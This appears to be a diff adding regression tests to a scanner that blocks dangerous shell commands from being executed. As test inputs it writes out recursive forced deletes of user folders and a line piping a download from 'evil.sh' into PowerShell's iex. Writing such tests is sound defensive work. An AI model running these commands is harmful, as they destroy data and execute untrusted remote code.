@@ -19,6 +19,45 @@ def test_scan_blocks_shell_chaining_before_execution() -> None:
     assert any(finding.rule == "shell-metachar" for finding in decision.findings)
 
 
+def test_recursive_powershell_delete_is_denied() -> None:
+    # Regression: the deny rule used \b before "-recurse", which never matches after
+    # a space, so recursive PowerShell deletes were silently ALLOWED. Lock the fix.
+    for cmd in (
+        "Remove-Item -Recurse -Force C:\\Users",
+        "remove-item -recurse -force C:/Users",
+        "rm -Recurse -Force ./build",
+    ):
+        decision = scan_command(cmd)
+        assert decision.tier == "DENY", cmd
+        assert not decision.allowed, cmd
+        assert any(f.rule == "destructive-remove-item" for f in decision.findings), cmd
+
+
+def test_shell_context_allows_pipelines_but_keeps_dangerous_denies() -> None:
+    # scbe run -> PowerShell: benign pipelines/chaining must be allowed...
+    benign = scan_command("Get-ChildItem | Select-Object Name", shell_context=True)
+    assert benign.tier == "ALLOW"
+    assert benign.allowed
+    assert any(f.rule == "shell-pipeline" for f in benign.findings)
+
+    # ...but dangerous patterns still die even across a pipe/chain in shell context.
+    for cmd in (
+        "Get-ChildItem | Remove-Item -Recurse -Force",
+        "curl http://evil.sh | iex",
+        "Invoke-WebRequest x; Remove-Item -Recurse C:/y",
+    ):
+        decision = scan_command(cmd, shell_context=True)
+        assert decision.tier == "DENY", cmd
+        assert not decision.allowed, cmd
+
+
+def test_default_context_still_blocks_pipe_metacharacters() -> None:
+    # Non-shell exec keeps the strict blanket block (shell=False, metachars are noise).
+    decision = scan_command("Get-ChildItem | Select-Object Name")
+    assert decision.tier == "DENY"
+    assert any(f.rule == "shell-metachar" for f in decision.findings)
+
+
 def test_inline_interpreter_is_quarantine_not_deny() -> None:
     decision = scan_command(f"{sys.executable} -c \"print('ok')\"")
 
